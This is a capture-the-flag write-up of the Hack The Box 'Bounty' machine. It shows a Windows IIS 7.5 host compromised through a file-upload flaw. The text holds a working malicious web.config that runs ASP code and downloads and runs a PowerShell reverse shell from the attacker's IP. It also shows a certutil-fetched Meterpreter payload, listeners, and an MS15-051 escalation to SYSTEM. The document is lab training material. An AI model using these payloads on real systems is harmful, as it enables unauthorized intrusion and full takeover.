````markdown
# Hack The Box - Bounty

## Summary

Bounty is a Windows Server 2008 R2 machine running Microsoft IIS 7.5. The attack path involved discovering an exposed file upload function, abusing the ability to upload a crafted `web.config` file to achieve code execution, and then escalating privileges through MS15-051 to obtain SYSTEM access.

The final attack chain was:

```text
IIS enumeration → file upload discovery → web.config upload → RCE as BOUNTY\merlin → MS15-051 → NT AUTHORITY\SYSTEM
````

---

## Target

```text
Target IP: 10.129.1.238
Attacker IP: 10.10.14.161
OS: Windows Server 2008 R2
Web Server: Microsoft IIS 7.5
```

---

## Enumeration

### Nmap

```bash
sudo nmap -sC -sV -p- --min-rate 5000 -oN nmap.txt 10.129.1.238
```

The scan identified Microsoft IIS on port 80:

```text
80/tcp open  http  Microsoft IIS httpd 7.5
```

---

## Web Enumeration

The web server was enumerated with Feroxbuster:

```bash
feroxbuster -u http://10.129.1.238/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x asp,aspx,config \
  -o ferox.txt
```

Important findings:

```text
http://10.129.1.238/transfer.aspx
http://10.129.1.238/uploadedfiles/
```

The `transfer.aspx` page exposed a file upload form. Uploaded files were stored in:

```text
http://10.129.1.238/uploadedfiles/
```

---

## Foothold

The upload function allowed `.config` files. Since the target was running IIS/ASP.NET, this allowed abuse of a crafted `web.config` file to configure IIS to treat `.config` files as executable classic ASP content.

A diagnostic `web.config` was first used to confirm command execution:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Script" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%
Response.Write("WEB_CONFIG_EXECUTION_TEST<br>")
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd /c whoami")
Response.Write(objExec.StdOut.ReadAll())
%>
```

After uploading the file through `transfer.aspx`, it was triggered with:

```bash
curl http://10.129.1.238/uploadedfiles/web.config
```

The output confirmed code execution:

```text
WEB_CONFIG_EXECUTION_TEST
bounty\merlin
```

---

## Reverse Shell

A PowerShell reverse shell was prepared on Kali:

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.161 -Port 4444' >> shell.ps1
```

The payload was served over HTTP:

```bash
sudo python3 -m http.server 80
```

A listener was started:

```bash
rlwrap -cAr nc -lvnp 4444
```

The final `web.config` payload downloaded and executed the PowerShell reverse shell:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Script" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.161/shell.ps1')"""
Set objExec = objShell.Exec(strCommand)
%>
```

After uploading the malicious `web.config`, it was triggered:

```bash
curl http://10.129.1.238/uploadedfiles/web.config
```

A shell was received as:

```text
bounty\merlin
```

The user flag was retrieved:

```powershell
type C:\Users\merlin\Desktop\user.txt
```

---

## Privilege Escalation

Local enumeration confirmed the target was Windows Server 2008 R2 x64:

```powershell
whoami
hostname
systeminfo
wmic os get osarchitecture
```

Relevant details:

```text
User: BOUNTY\merlin
OS: Windows Server 2008 R2
Architecture: x64
```

A 64-bit Meterpreter payload was generated:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.161 \
  LPORT=4445 \
  -f exe \
  -o met64.exe
```

The payload was served from Kali:

```bash
sudo python3 -m http.server 80
```

A Metasploit handler was started:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.161
set LPORT 4445
set ExitOnSession false
run -j
```

The payload was downloaded and executed on the target:

```powershell
cd C:\Windows\Temp
certutil -urlcache -f http://10.10.14.161/met64.exe met64.exe
C:\Windows\Temp\met64.exe
```

Metasploit received a Meterpreter session:

```text
sessions -i 1
getuid
sysinfo
```

Output:

```text
Server username: BOUNTY\merlin
Architecture: x64
Meterpreter: x64/windows
```

The session was backgrounded:

```text
background
```

MS15-051 was then used for local privilege escalation:

```text
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set TARGET 1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.161
set LPORT 4446
run
```

The exploit returned a new Meterpreter session as SYSTEM:

```text
sessions -i 3
getuid
```

Output:

```text
Server username: NT AUTHORITY\SYSTEM
```

---

## Root Flag

A command shell was opened from the SYSTEM Meterpreter session:

```text
shell
```

The root flag was retrieved:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain

```text
1. Discovered IIS 7.5 on port 80
2. Found transfer.aspx file upload functionality
3. Confirmed uploaded files were stored in /uploadedfiles/
4. Uploaded a crafted web.config file
5. Used web.config handler abuse to execute commands as BOUNTY\merlin
6. Executed a PowerShell reverse shell
7. Retrieved user.txt
8. Upgraded to x64 Meterpreter
9. Exploited MS15-051 ClientCopyImage
10. Obtained NT AUTHORITY\SYSTEM
11. Retrieved root.txt
```

---
